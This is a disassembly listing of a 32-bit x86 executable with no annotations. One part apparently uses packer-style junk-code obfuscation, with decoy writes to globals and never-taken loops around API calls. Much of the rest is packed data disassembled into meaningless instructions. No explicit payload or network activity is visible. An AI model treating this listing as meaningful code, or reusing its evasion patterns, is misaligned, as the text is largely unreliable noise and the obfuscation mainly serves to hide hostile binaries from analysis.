  4119b3:	dec    ecx
  4119b4:	addr16 in al,0xea
  4119b7:	ret    
  4119b8:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4119ba:	pop    ecx
  4119bb:	fmul   DWORD PTR [eax]
  4119bd:	repnz adc ch,BYTE PTR [eax+0x11]
  4119c1:	pop    esp
  4119c2:	push   esi
  4119c3:	sti    
  4119c4:	scas   al,BYTE PTR es:[edi]
  4119c5:	add    eax,0xe6fd8683
  4119ca:	mov    al,ds:0xe777430f
  4119cf:	inc    ebx
  4119d0:	add    eax,0xb762f4b6
  4119d5:	mov    al,ds:0xa3ba3dd3
  4119da:	stc    
  4119db:	ror    BYTE PTR [ecx],cl
  4119dd:	ins    BYTE PTR es:[edi],dx
  4119de:	repz shl BYTE PTR [ebp-0x3f],0x66
  4119e3:	jg     0x41197e
  4119e5:	jecxz  0x4119ca
  4119e7:	sbb    bl,BYTE PTR [eax+ebp*1+0xb]
  4119eb:	inc    esp
  4119ec:	pushf  
  4119ed:	mov    al,0xf2
  4119ef:	loope  0x4119dd
  4119f1:	add    bl,BYTE PTR [esi+0x62f89853]
  4119f7:	sub    cl,BYTE PTR [ecx+0x6c]
  4119fa:	retf   0x3c41
  4119fd:	adc    al,BYTE PTR [esp+esi*1+0x660b6567]
  411a04:	addr16 jo 0x411a1b
  411a07:	dec    esi
  411a08:	xchg   ebx,eax
  411a09:	pushf  
  411a0a:	jnp    0x4119dd
  411a0c:	inc    edx
  411a0d:	mov    al,ds:0xf90b763d
  411a12:	xchg   esi,eax
  411a13:	xchg   esi,eax
  411a14:	pop    edx
  411a15:	dec    ebp
  411a16:	fsubp  st(7),st
  411a18:	mov    bh,0x98
  411a1a:	push   edi
  411a1b:	mov    cl,0x5
  411a1d:	outs   dx,DWORD PTR ds:[esi]
  411a1e:	ds inc esp
  411a20:	xor    eax,DWORD PTR [ebp-0x119df69e]
  411a26:	xchg   edi,eax
  411a27:	xor    al,0xcc
  411a29:	call   0x6600:0x8a94b9
  411a30:	xor    ecx,DWORD PTR [edi+edx*4+0x2]
  411a34:	and    DWORD PTR ds:0x42867b,0x0
  411a3e:	jmp    0x411a50
  411a43:	mov    edi,DWORD PTR ds:0x42867b
  411a49:	inc    edi
  411a4a:	mov    DWORD PTR ds:0x42867b,edi
  411a50:	cmp    DWORD PTR ds:0x42867b,0x1d
  411a57:	jae    0x411a7f
  411a5d:	cmp    DWORD PTR ds:0x42867b,0x24
  411a64:	ja     0x411a7f
  411a6a:	jmp    0x411a7a
  411a6f:	push   0x42801b
  411a74:	call   DWORD PTR ds:0x4287c3
  411a7a:	jmp    0x411a43
  411a7f:	mov    edi,0x3b56
  411a84:	adc    DWORD PTR ds:0x428657,0x6690
  411a8e:	add    cx,di
  411a91:	sub    DWORD PTR ds:0x42863f,0x428617
  411a9b:	movzx  ecx,cx
  411a9e:	xor    DWORD PTR ds:0x428633,0x428667
  411aa8:	mov    DWORD PTR [ebp-0xc],ecx
  411aab:	or     DWORD PTR ds:0x42862f,edx
  411ab1:	mov    ecx,DWORD PTR [ebp+0x8]
  411ab4:	movzx  ecx,WORD PTR [ecx+edx*4]
  411ab8:	add    DWORD PTR ds:0x4285e7,0xc83
  411ac2:	xor    ecx,0x8a94
  411ac8:	sub    DWORD PTR ds:0x42860f,0x428677
  411ad2:	add    ecx,edi
  411ad4:	mov    edi,DWORD PTR [ebp-0xc]
  411ad7:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  411ade:	inc    edx
  411adf:	mov    ecx,DWORD PTR [ebp-0x10]
  411ae2:	mov    DWORD PTR ds:0x428637,0x76f
  411aec:	cmp    edx,ecx
  411aee:	mov    DWORD PTR ds:0x428647,0x6bd4
  411af8:	jne    0x40f686
  411afe:	and    DWORD PTR ds:0x428647,0x0
  411b08:	mov    ecx,DWORD PTR ds:0x428647
  411b0e:	inc    ecx
  411b0f:	mov    DWORD PTR ds:0x428647,ecx
  411b15:	cmp    DWORD PTR ds:0x428647,0x1b
  411b1c:	jbe    0x411b4e
  411b22:	jmp    0x411b41
  411b27:	push   0x428603
  411b2c:	push   DWORD PTR [ebp-0x14]
  411b2f:	push   DWORD PTR [ebp-0x28]
  411b32:	push   DWORD PTR [ebp-0x10]
  411b35:	push   DWORD PTR [ebp-0x10]
  411b38:	push   DWORD PTR [ebp-0x20]
  411b3b:	call   DWORD PTR ds:0x4287c7
  411b41:	cmp    DWORD PTR ds:0x428647,0x17
  411b48:	jb     0x411b08
  411b4e:	mov    ecx,DWORD PTR [ebp-0x18]
  411b51:	xor    edi,edi
  411b53:	mov    edx,DWORD PTR [ebp+0x10]
  411b56:	adc    DWORD PTR ds:0x42864b,ecx
  411b5c:	xor    ecx,eax
  411b5e:	add    ecx,esi
  411b60:	mov    DWORD PTR [edx],ecx
  411b62:	mov    ecx,DWORD PTR [ebp-0x18]
  411b65:	xor    ecx,eax
  411b67:	add    ecx,esi
  411b69:	adc    DWORD PTR ds:0x4285d7,ebx
  411b6f:	mov    DWORD PTR [ebp-0xc],ecx
  411b72:	mov    DWORD PTR [ebp+0x8],0xf89c85b0
  411b79:	adc    edi,DWORD PTR ds:0x428663
  411b7f:	mov    DWORD PTR [ebp-0x14],0xf89c8580
  411b86:	or     DWORD PTR ds:0x42866b,ebx
  411b8c:	mov    DWORD PTR [ebp-0x10],0xf89c95b0
  411b93:	sub    DWORD PTR ds:0x428673,edx
  411b99:	mov    ecx,DWORD PTR [ebp-0x14]
  411b9c:	and    DWORD PTR ds:0x428637,edi
  411ba2:	mov    DWORD PTR [ebp+0x8],ecx
  411ba5:	mov    ecx,DWORD PTR [ebp+0x8]
  411ba8:	mov    edi,DWORD PTR ds:0x42865f
  411bae:	adc    DWORD PTR ds:0x428613,edi
  411bb4:	xor    ecx,eax
  411bb6:	add    ecx,esi
  411bb8:	mov    ecx,0x242ebcc
  411bbd:	mov    DWORD PTR ds:0x428613,0x3550
  411bc7:	mov    edi,0xf641bc3
  411bcc:	mov    DWORD PTR ds:0x428633,0x2c84
  411bd6:	je     0x41b172
  411bdc:	mov    ebx,DWORD PTR ds:0x4286b7
  411be2:	mov    edx,DWORD PTR ds:0x4286e3
  411be8:	sub    edx,ebx
  411bea:	imul   ebx,DWORD PTR [ebx+edx*1]
  411bee:	mov    edx,DWORD PTR [ebp+0x8]
  411bf1:	movzx  ebx,BYTE PTR ds:0x4285ef
  411bf8:	sub    DWORD PTR ds:0x428657,ebx
  411bfe:	mov    ebx,DWORD PTR [ebp-0x8]
  411c01:	adc    DWORD PTR ds:0x42860f,0x4285eb
  411c0b:	xor    edx,eax
  411c0d:	sub    DWORD PTR ds:0x428643,0x428673
  411c17:	xor    ebx,eax
  411c19:	sub    edx,ebx
  411c1b:	and    DWORD PTR ds:0x42866f,ecx
  411c21:	sub    edx,esi
  411c23:	xor    edx,eax
  411c25:	adc    DWORD PTR ds:0x42865b,ebx
  411c2b:	mov    DWORD PTR [ebp+0x8],edx
  411c2e:	mov    edx,DWORD PTR ds:0x42867f
  411c34:	mov    ebx,DWORD PTR ds:0x4286fb
  411c3a:	sub    ebx,edx
  411c3c:	imul   edx,DWORD PTR [edx+ebx*1]
  411c40:	mov    edx,DWORD PTR [ebp+0x8]
  411c43:	and    DWORD PTR ds:0x428647,0x0
  411c4d:	jmp    0x411c61
  411c52:	xor    ebx,ebx
  411c54:	xor    ebx,DWORD PTR ds:0x428647
  411c5a:	inc    ebx
  411c5b:	mov    DWORD PTR ds:0x428647,ebx
  411c61:	cmp    DWORD PTR ds:0x428647,0x14
  411c68:	jae    0x411cb1
  411c6e:	cmp    DWORD PTR ds:0x428647,0xc
  411c75:	jle    0x411cb1
  411c7b:	jmp    0x411c90
  411c80:	push   0x4285d3
  411c85:	push   0x42800b
  411c8a:	call   DWORD PTR ds:0x4287cb
  411c90:	cmp    DWORD PTR ds:0x428647,0xb
  411c97:	jne    0x411cac
  411c9d:	xor    ebx,ebx
  411c9f:	xor    ebx,DWORD PTR ds:0x428647
  411ca5:	inc    ebx
  411ca6:	mov    DWORD PTR ds:0x428647,ebx
  411cac:	jmp    0x411c52
  411cb1:	mov    ebx,DWORD PTR [ebp-0x58]
  411cb4:	not    DWORD PTR ds:0x4285e3
  411cba:	add    edx,0x5708f1
  411cc0:	sbb    DWORD PTR ds:0x42866f,0xe9d
  411cca:	imul   edx,ebx
  411ccd:	mov    DWORD PTR [ebp-0x58],edx
  411cd0:	mov    edx,DWORD PTR [ebp+0x8]
  411cd3:	movzx  ebx,WORD PTR ds:0x42863f
  411cda:	xor    DWORD PTR ds:0x428677,ebx
  411ce0:	mov    ebx,DWORD PTR [ebp-0x54]
  411ce3:	add    edx,0x64f893
  411ce9:	or     edx,ebx
  411ceb:	dec    ebx
  411cec:	mov    DWORD PTR [ebp-0x54],edx
  411cef:	mov    edx,DWORD PTR [ebp+0x8]
  411cf2:	xor    DWORD PTR ds:0x428613,edi
  411cf8:	mov    ebx,DWORD PTR [ebp-0x50]
  411cfb:	adc    DWORD PTR ds:0x42862b,0x428663
  411d05:	add    edx,ecx
  411d07:	xor    edx,ebx
  411d09:	inc    DWORD PTR ds:0x42864b
  411d0f:	mov    DWORD PTR [ebp-0x50],edx
  411d12:	sbb    DWORD PTR ds:0x42865f,0x428633
  411d1c:	mov    edx,DWORD PTR [ebp+0x8]
  411d1f:	add    DWORD PTR ds:0x42863f,0x2dae
  411d29:	mov    ebx,DWORD PTR [ebp-0x4c]
  411d2c:	add    edx,edi
  411d2e:	inc    DWORD PTR ds:0x428617
  411d34:	and    edx,ebx
  411d36:	and    ebx,0x7d1c
  411d3c:	mov    DWORD PTR [ebp-0x4c],edx
  411d3f:	xor    DWORD PTR ds:0x428613,0x4285ef
  411d49:	mov    edx,DWORD PTR [ebp+0x8]
  411d4c:	mov    ebx,DWORD PTR [ebp-0x48]
  411d4f:	lea    edx,[ebx+edx*1+0x241fcde]
  411d56:	mov    ebx,DWORD PTR ds:0x42863f
  411d5c:	and    DWORD PTR ds:0x428633,ebx
  411d62:	mov    DWORD PTR [ebp-0x48],edx
  411d65:	or     ebx,0x3ec
  411d6b:	mov    edx,DWORD PTR [ebp+0x8]
  411d6e:	mov    ebx,0xfa5e1521
  411d73:	or     DWORD PTR ds:0x428647,0x60bd
  411d7d:	sub    ebx,edx
  411d7f:	add    edx,DWORD PTR ds:0x42866f
  411d85:	add    ebx,DWORD PTR [ebp-0x44]
  411d88:	mov    DWORD PTR [ebp-0x44],ebx
  411d8b:	and    DWORD PTR ds:0x42867b,0x0
  411d95:	jmp    0x411da7
  411d9a:	mov    edx,DWORD PTR ds:0x42867b
  411da0:	inc    edx
  411da1:	mov    DWORD PTR ds:0x42867b,edx
  411da7:	cmp    DWORD PTR ds:0x42867b,0x18
  411dae:	jae    0x411dfe
  411db4:	cmp    DWORD PTR ds:0x42867b,0xa
  411dbb:	jge    0x411dfe
  411dc1:	jmp    0x411ddf
  411dc6:	push   DWORD PTR [ebp-0x14]
  411dc9:	push   DWORD PTR [ebp-0x20]
  411dcc:	push   0x73a3
  411dd1:	push   DWORD PTR [ebp-0xc]
  411dd4:	push   0x249b
  411dd9:	call   DWORD PTR ds:0x42879f
  411ddf:	cmp    DWORD PTR ds:0x42867b,0x9
  411de6:	jne    0x411df9
  411dec:	mov    edx,DWORD PTR ds:0x42867b
  411df2:	inc    edx
  411df3:	mov    DWORD PTR ds:0x42867b,edx
  411df9:	jmp    0x411d9a
  411dfe:	mov    edx,DWORD PTR [ebp+0x8]
  411e01:	adc    DWORD PTR ds:0x4285d3,0x42865b
  411e0b:	xor    edx,eax
  411e0d:	or     DWORD PTR ds:0x428657,0x7d10
  411e17:	add    edx,esi
  411e19:	mov    DWORD PTR ds:0x428613,0x2646
  411e23:	jne    0x411bdc
  411e29:	jmp    0x41b172
  411e2e:	and    ebx,DWORD PTR ds:0x428603
  411e34:	mov    edx,DWORD PTR [ebp-0xc]
  411e37:	sub    edx,esi
  411e39:	add    ebx,0x210e
  411e3f:	xor    edx,eax
  411e41:	mov    DWORD PTR [ebp-0x5c],edx
  411e44:	and    DWORD PTR ds:0x4285ef,0x0
  411e4e:	jmp    0x411e62
  411e53:	xor    ebx,ebx
  411e55:	add    ebx,DWORD PTR ds:0x4285ef
  411e5b:	inc    ebx
  411e5c:	mov    DWORD PTR ds:0x4285ef,ebx
  411e62:	cmp    DWORD PTR ds:0x4285ef,0x17
  411e69:	jae    0x411ea9
  411e6f:	cmp    DWORD PTR ds:0x4285ef,0xe
  411e76:	ja     0x411ea9
  411e7c:	jmp    0x411e8a
  411e81:	push   DWORD PTR [ebp-0xc]
  411e84:	call   DWORD PTR ds:0x4287a3
  411e8a:	cmp    DWORD PTR ds:0x4285ef,0xd
  411e91:	jne    0x411ea4
  411e97:	mov    ebx,DWORD PTR ds:0x4285ef
  411e9d:	inc    ebx
  411e9e:	mov    DWORD PTR ds:0x4285ef,ebx
  411ea4:	jmp    0x411e53
  411ea9:	mov    edx,DWORD PTR [ebp-0x10]
  411eac:	mov    DWORD PTR ds:0x4285db,0x15
  411eb6:	cmp    DWORD PTR ds:0x4285db,0x0
  411ebd:	je     0x411f11
  411ec3:	cmp    DWORD PTR ds:0x4285db,0x6
  411eca:	jl     0x411f11
  411ed0:	jmp    0x411ee5
  411ed5:	push   0x12dd
  411eda:	push   0x428000
  411edf:	call   DWORD PTR ds:0x4287a7
  411ee5:	cmp    DWORD PTR ds:0x4285db,0x7
  411eec:	jne    0x411eff
  411ef2:	mov    ebx,DWORD PTR ds:0x4285db
  411ef8:	dec    ebx
  411ef9:	mov    DWORD PTR ds:0x4285db,ebx
  411eff:	mov    ebx,DWORD PTR ds:0x4285db
  411f05:	dec    ebx
  411f06:	mov    DWORD PTR ds:0x4285db,ebx
  411f0c:	jmp    0x411eb6
  411f11:	mov    ebx,DWORD PTR [ebp-0x8]
  411f14:	xor    edx,eax
  411f16:	xor    DWORD PTR ds:0x42863b,0x3a5d
  411f20:	xor    ebx,eax
  411f22:	sub    edx,ebx
  411f24:	adc    DWORD PTR ds:0x42860f,0x428633
  411f2e:	sub    edx,esi
  411f30:	and    DWORD PTR ds:0x42864f,0x428607
  411f3a:	xor    edx,eax
  411f3c:	mov    DWORD PTR ds:0x428663,0x12b9
  411f46:	mov    DWORD PTR [ebp-0x10],edx
  411f49:	movzx  edx,WORD PTR ds:0x42863f
  411f50:	mov    edx,DWORD PTR [ebp-0x14]
  411f53:	mov    DWORD PTR [ebp+0x8],edx
  411f56:	jmp    0x414473
  411f5b:	adc    DWORD PTR ds:0x42866b,0x365a
  411f65:	mov    edx,DWORD PTR [ebp+0x8]
  411f68:	add    DWORD PTR ds:0x42865b,0x2d5e
  411f72:	mov    ebx,DWORD PTR [ebp-0x8]
  411f75:	xor    edx,eax
  411f77:	xor    ebx,eax
  411f79:	jmp    0x41431a
  411f7e:	push   0xf
  411f80:	xor    al,0x44
  411f82:	pop    ss
  411f83:	inc    edi
  411f84:	or     al,BYTE PTR [edi]
  411f86:	into   
  411f87:	addr16 mov ds:0x63f4,al
  411f8b:	jbe    0x411f10
  411f8d:	and    al,dh
  411f8f:	cmp    BYTE PTR [edx+0x7a],0xfe
  411f93:	pop    edi
  411f94:	jp     0x412010
  411f96:	cmp    BYTE PTR ds:0x70cf511b,dh
  411f9c:	popa   
  411f9d:	popa   
  411f9e:	mov    al,0x67
  411fa0:	sub    eax,0xbf241603
  411fa5:	in     al,dx
  411fa6:	lahf   
  411fa7:	cmp    al,0x3f
  411fa9:	std    
  411faa:	ins    DWORD PTR es:[edi],dx
  411fab:	fmul   DWORD PTR [esi-0x18]
  411fae:	push   esp
  411faf:	mov    bh,0x5
  411fb1:	sbb    al,0xdd
  411fb3:	enter  0x267c,0x80
  411fb7:	adc    al,0x71
  411fb9:	imul   edi,DWORD PTR [ebx+0x3d],0x5a
  411fbd:	add    bl,BYTE PTR [ebx-0x57]
  411fc0:	jecxz  0x411f56
  411fc2:	sub    dh,dl
  411fc4:	(bad)  
  411fc5:	sbb    BYTE PTR [edi+0x41],dl
  411fc8:	enter  0x17f,0x59
  411fcc:	fidiv  DWORD PTR [edx-0x3ca1eb86]
  411fd2:	sbb    eax,0xb9bf6134
  411fd7:	rol    dh,0x93
  411fda:	fisubr DWORD PTR [ebp-0x6922b7ed]
  411fe0:	repnz aam 0x97
  411fe3:	xchg   ebp,eax
  411fe4:	or     dl,ch
  411fe6:	ja     0x412016
  411fe8:	retf   0x3126
  411feb:	add    al,al
  411fed:	and    BYTE PTR [esi+0x408f8f03],bh
  411ff3:	xchg   ebp,eax
  411ff4:	jo     0x412043
  411ff6:	call   0x159aaa25
  411ffb:	pop    ebp
  411ffc:	call   0x216cdc71
  412001:	xor    eax,0x6c6e8613
  412006:	cdq    
  412007:	xor    DWORD PTR [edx+0x5fafa9ab],eax
  41200d:	sub    DWORD PTR [ebx-0x7],edi
  412010:	jle    0x412027
  412012:	sbb    dh,BYTE PTR [eax-0x75]
  412015:	jbe    0x412029
  412017:	and    al,BYTE PTR [edx+eax*1-0x2e]
  41201b:	imul   esi,DWORD PTR ds:[edi-0x3f],0xffffffb1
  412020:	sbb    ax,0xc8c
  412024:	pop    es
  412025:	test   DWORD PTR [edi-0x6e],esi
  412028:	addr16 (bad) 
  41202a:	imul   edx,DWORD PTR [eax-0x1886d3e3],0x369eec8d
  412034:	push   cs
  412035:	mov    bl,0x21
  412037:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412038:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412039:	rcl    DWORD PTR [eax],1
  41203b:	mov    dh,0x6e
  41203d:	dec    edx
  41203e:	ins    DWORD PTR es:[edi],dx
  41203f:	ja     0x4120ad
  412041:	cmp    ebx,DWORD PTR [ecx+ecx*2]
  412044:	fs pop ss
  412046:	dec    ebx
  412047:	hlt    
  412048:	cmp    BYTE PTR [ebx-0x60cb5c25],al
  41204e:	inc    eax
  41204f:	or     al,0x4e
  412051:	imul   edx,ebx,0x6d
  412054:	xor    eax,0x8ca46f9c
  412059:	int3   
  41205a:	and    ebx,ecx
  41205c:	sbb    DWORD PTR [edx],edi
  41205e:	cs mov edx,0x45fd6e9e
  412064:	add    edx,0xffffff83
  412067:	xchg   esi,eax
  412068:	and    edx,esi
  41206a:	lea    ebp,[ecx-0x678017d2]
  412070:	jns    0x412074
  412072:	(bad)  
  412073:	adc    cl,al
  412075:	retf   
  412076:	sbb    DWORD PTR [ebp+0x24],ecx
  412079:	repz jns 0x4120c4
  41207c:	repz sub eax,0xe2566a9a
  412082:	add    BYTE PTR [eax+0xfe5c960],bl
  412088:	into   
  412089:	jp     0x412050
  41208b:	ins    DWORD PTR es:[edi],dx
  41208c:	xor    ah,BYTE PTR [edi+0xb927dff]
  412092:	fcomp  QWORD PTR [ebx+0x7]
  412095:	fdiv   QWORD PTR [edi+0xd]
  412098:	push   es
  412099:	test   BYTE PTR [esi],bl
  41209b:	mov    DWORD PTR [ecx-0x43],eax
  41209e:	sub    ebx,DWORD PTR [eax+0xa]
  4120a1:	sub    ah,BYTE PTR [ecx+0x789b1519]
  4120a7:	in     eax,dx
  4120a8:	sbb    edx,DWORD PTR ds:0x986e8cfa
  4120ae:	ja     0x4120eb
  4120b0:	jmp    0x5715:0xd10c1ec2
  4120b7:	and    DWORD PTR [esi+edx*2],eax
  4120ba:	inc    edx
  4120bb:	pop    eax
  4120bc:	or     DWORD PTR [edx-0x6c],esi
  4120bf:	push   ss
  4120c0:	mov    ds:0xd2af6e74,al
  4120c5:	loopne 0x412053
  4120c7:	les    ebx,FWORD PTR [eax]
  4120c9:	mov    ebp,0x8dc20b79
  4120ce:	mov    ds:0x139d2534,al
  4120d3:	gs (bad) 
  4120d5:	jo     0x4120ee
  4120d7:	pop    esp
  4120d8:	and    DWORD PTR [ebp+0x34],edi
  4120db:	jne    0x4120bb
  4120dd:	ret    
  4120de:	loopne 0x412097
  4120e0:	and    eax,0xad88183c
  4120e5:	xor    bl,BYTE PTR [edi+0x40]
  4120e8:	aad    0xfb
  4120ea:	cmp    ebp,DWORD PTR [ebx-0x66]
  4120ed:	mov    dl,0xe7
  4120ef:	xchg   esi,eax
  4120f0:	adc    ch,0xbe
  4120f3:	scas   eax,DWORD PTR es:[edi]
  4120f4:	fisttp QWORD PTR [edi+edx*1]
  4120f7:	and    esi,DWORD PTR [ebx]
  4120f9:	loop   0x412160
  4120fb:	call   0xfdab5956
  412100:	cdq    
  412101:	mov    BYTE PTR [edi+0x14],ch
  412104:	add    BYTE PTR [edx+0x39],dl
  412107:	bound  ebx,QWORD PTR [edi+esi*1-0x61]
  41210b:	dec    eax
  41210c:	pop    ebx
  41210d:	pop    ss
  41210e:	(bad)  
  41210f:	int    0x4b
  412111:	mov    ecx,edx
  412113:	cwde   
  412114:	fnstsw WORD PTR gs:0x1f7237a2
  41211b:	jns    0x4120d2
  41211d:	pushf  
  41211e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41211f:	lock add DWORD PTR [ebp+0x1b],esp
  412123:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  412125:	shr    BYTE PTR [ecx],1
  412127:	(bad)  
  412128:	push   0xa3124e67
  41212d:	sub    cl,BYTE PTR [eax+eax*4]
  412130:	nop
  412131:	xchg   BYTE PTR [edx],bh
  412133:	fidivr WORD PTR [edx+0x6dffc86c]
  412139:	jle    0x412155
  41213b:	mov    bl,0x2c
  41213d:	data16 addr16 mov dl,0x87
  412141:	mov    al,ds:0x125b18bc
  412146:	cmp    BYTE PTR [edx+0x48],ch
  412149:	inc    edi
  41214a:	inc    edx
  41214b:	mov    eax,ds:0x5cd5d68c
  412150:	fsub   st,st(7)
  412152:	cmp    BYTE PTR [esi+0x31],al
  412155:	add    al,0x72
  412157:	pop    ebp
  412158:	dec    esp
  412159:	sbb    BYTE PTR [edi-0x72b368b1],bh
  41215f:	mov    WORD PTR [esi-0x3e],?
  412162:	scas   al,BYTE PTR es:[edi]
  412163:	pushf  
  412164:	mov    dl,0x67
  412166:	pop    edi
  412167:	lahf   
  412168:	pop    es
  412169:	es ins DWORD PTR es:[edi],dx
  41216b:	das    
  41216c:	loopne 0x412104
  41216e:	adc    ebp,DWORD PTR [ebx]
  412170:	or     DWORD PTR [esp+ebx*1],esp
  412173:	dec    edi
  412174:	mov    edi,0xfebead06
  412179:	fsubr  st,st(7)
  41217b:	push   edi
  41217c:	popa   
  41217d:	push   cs
  41217e:	adc    BYTE PTR [edx+0x3caf1640],bl
  412184:	inc    edx
  412185:	push   0xe1f4f995
  41218a:	shl    DWORD PTR [ecx-0x51],0xea
  41218e:	idiv   DWORD PTR [ecx+ecx*1+0x46a4e202]
  412195:	fs ss ins DWORD PTR es:[edi],dx
  412198:	loop   0x4121ca
  41219a:	mov    bl,0xe6
  41219c:	fwait
  41219d:	dec    esi
  41219e:	inc    edx
  41219f:	xor    bh,dh
  4121a1:	pusha  
  4121a2:	or     eax,DWORD PTR ss:[esi+0x7c]
  4121a6:	xor    ebx,DWORD PTR [ebx]
  4121a8:	cld    
  4121a9:	das    
  4121aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121ab:	ja     0x41214a
  4121ad:	test   DWORD PTR [edi+0x20],ebx
  4121b0:	jmp    0x4121f2
  4121b2:	aam    0xf4
  4121b4:	shl    DWORD PTR [ecx],cl
  4121b6:	xchg   ebx,eax
  4121b7:	mov    esi,0xb29c5078
  4121bc:	jecxz  0x412163
  4121be:	pop    ebx
  4121bf:	sub    al,0x46
  4121c1:	(bad)  
  4121c2:	es stos BYTE PTR es:[edi],al
  4121c4:	pop    ebp
  4121c5:	and    dh,cl
  4121c7:	add    al,0x13
  4121c9:	or     dh,ah
  4121cb:	jb     0x41223a
  4121cd:	jl     0x41217e
  4121cf:	loopne 0x4121b8
  4121d1:	int    0x2f
  4121d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121d4:	adc    ch,BYTE PTR [ebx+eax*4-0x1a]
  4121d8:	jo     0x4121b0
  4121da:	inc    ebx
  4121db:	jmp    0x412205
  4121dd:	out    0xf8,eax
  4121df:	gs inc ebp
  4121e1:	and    al,cl
  4121e3:	pop    ss
  4121e4:	xor    eax,0xa0f93e59
  4121e9:	repz imul esp,DWORD PTR [eax],0x61a3e799
  4121f0:	std    
  4121f1:	jmp    0x5b9f:0xfb79a9e6
  4121f8:	add    al,0x5
  4121fa:	jb     0x412246
  4121fc:	xchg   esi,eax
  4121fd:	ins    DWORD PTR es:[edi],dx
  4121fe:	ss jg  0x412280
  412201:	idiv   ch
  412203:	loop   0x4121ca
  412205:	cmp    dl,cl
  412207:	aas    
  412208:	hlt    
  412209:	and    DWORD PTR ds:0x49d8147a,esi
  41220f:	sbb    ebp,edx
  412211:	ds out dx,eax
  412213:	out    0xf,eax
  412215:	out    dx,al
  412216:	mov    ebx,DWORD PTR [edi+0x4fa36c66]
  41221c:	das    
  41221d:	xchg   ebx,eax
  41221e:	and    DWORD PTR [ebx],ebp
  412220:	lds    eax,FWORD PTR [ebp+0x2d]
  412223:	dec    ecx
  412224:	xor    bl,BYTE PTR [edx-0x31]
  412227:	mov    DWORD PTR [ecx+0x61],esp
  41222a:	mov    ebp,0xba7c4fdb
  41222f:	and    ebp,esi
  412231:	adc    edx,DWORD PTR [eax+0x6a]
  412234:	cs push cs
  412236:	or     eax,DWORD PTR [esi-0x466a2fbb]
  41223c:	(bad)  
  41223d:	push   ds
  41223e:	sub    esp,DWORD PTR [ebx-0x5b]
  412241:	stos   DWORD PTR es:[edi],eax
  412242:	pop    esp
  412243:	in     eax,0xbe
  412245:	lds    ebp,FWORD PTR [edi]
  412247:	bound  ebp,QWORD PTR [edx-0x719be0a0]
  41224d:	mov    ebp,0x2e9dc2de
  412252:	ja     0x412284
  412254:	pusha  
  412255:	sbb    eax,DWORD PTR [eax-0x68c2b930]
  41225b:	(bad)  
  41225c:	mov    ebp,0x80588958
  412261:	fwait
  412262:	xchg   edx,eax
  412263:	push   ebx
  412264:	xchg   ebp,eax
  412265:	or     ah,ah
  412267:	push   es
  412268:	xor    al,0x20
  41226a:	ret    0xd86b
  41226d:	iret   
  41226e:	test   eax,0xd93f5caa
  412273:	stos   DWORD PTR es:[edi],eax
  412274:	fidiv  DWORD PTR [ecx+0x21]
  412277:	sub    eax,0x1d69b17
  41227c:	lahf   
  41227d:	xchg   esp,eax
  41227e:	loop   0x41223d
  412280:	fldz   
  412282:	cld    
  412283:	jp     0x412251
  412285:	daa    
  412286:	adc    BYTE PTR [ebx],0x63
  412289:	push   DWORD PTR [ebp+edx*1-0x4d]
  41228d:	int    0xd8
  41228f:	pop    edi
  412290:	inc    ebx
  412291:	push   esp
  412292:	sub    DWORD PTR [esi],esp
  412294:	mov    ?,WORD PTR ds:0x233091b7
  41229a:	or     eax,DWORD PTR ds:0xdbd17ccb
  4122a1:	push   0x54
  4122a3:	ins    DWORD PTR es:[edi],dx
  4122a4:	(bad)  
  4122a5:	jecxz  0x41224e
  4122a7:	test   BYTE PTR es:[esi-0x7a5cab80],bl
  4122ae:	mov    ecx,0x27d2b2ac
  4122b3:	adc    ah,BYTE PTR [edi+ecx*4-0x7a]
  4122b7:	(bad)  
  4122b8:	push   ebp
  4122b9:	lahf   
  4122ba:	xchg   ecx,eax
  4122bb:	dec    edi
  4122bc:	cld    
  4122bd:	push   ss
  4122be:	ss je  0x412247
  4122c1:	push   eax
  4122c2:	or     BYTE PTR [ecx],0xa4
  4122c5:	sbb    eax,DWORD PTR [eax+eax*1]
  4122c8:	stos   BYTE PTR es:[edi],al
  4122c9:	inc    ebx
  4122ca:	dec    eax
  4122cb:	sti    
  4122cc:	mov    WORD PTR [ecx+0x50f09503],es
  4122d2:	out    dx,eax
  4122d3:	loopne 0x412315
  4122d5:	mov    esp,0x1bf2e29c
  4122da:	jl     0x412320
  4122dc:	ret    
  4122dd:	jno    0x4122f5
  4122df:	shr    DWORD PTR [edx+0x72808e77],1
  4122e5:	cmp    eax,0x4094594f
  4122ea:	(bad)  
  4122ec:	pop    ss
  4122ed:	fwait
  4122ee:	test   cl,dl
  4122f0:	pop    ecx
  4122f1:	sete   dh
  4122f4:	mov    bh,0xec
  4122f6:	xor    dl,BYTE PTR [edx+0x25]
  4122f9:	mov    eax,ds:0xde243621
  4122fe:	cmp    esp,esi
  412300:	aam    0xa3
  412302:	add    eax,0x212bba7a
  412307:	js     0x4122a9
  412309:	repnz stos DWORD PTR es:[edi],eax
  41230b:	mov    esp,ecx
  41230d:	and    dl,BYTE PTR [eax-0x7f]
  412310:	(bad)  
  412311:	mov    al,ds:0xf8f550f7
  412316:	pusha  
  412317:	pop    ebp
  412318:	xchg   esi,eax
  412319:	mov    esi,0xcc43af97
  41231e:	cmc    
  41231f:	in     al,dx
  412320:	lods   eax,DWORD PTR ds:[esi]
  412321:	inc    esp
  412322:	aaa    
  412323:	fnsave [esi+0x31c20e46]
  412329:	aam    0x89
  41232b:	mov    ebp,0x822701a3
  412330:	(bad)  
  412331:	leave  
  412332:	dec    eax
  412333:	mov    esi,0x357a9ede
  412338:	or     esp,esp
  41233a:	(bad)  
  41233b:	test   BYTE PTR [esp+esi*2-0x21b1a1d],0x99
  412343:	xchg   dh,al
  412345:	in     eax,dx
  412346:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412347:	stos   DWORD PTR es:[edi],eax
  412348:	jae    0xb2a86f22
  41234e:	(bad)  
  41234f:	and    eax,0xf91b8030
  412354:	dec    esi
  412355:	(bad)
  412359:	push   es
  41235a:	or     ebp,DWORD PTR [eax+0x5433fea]
  412360:	and    BYTE PTR [ecx-0x75873844],dl
  412366:	in     eax,dx
  412367:	call   0x7b64:0x55dc9448
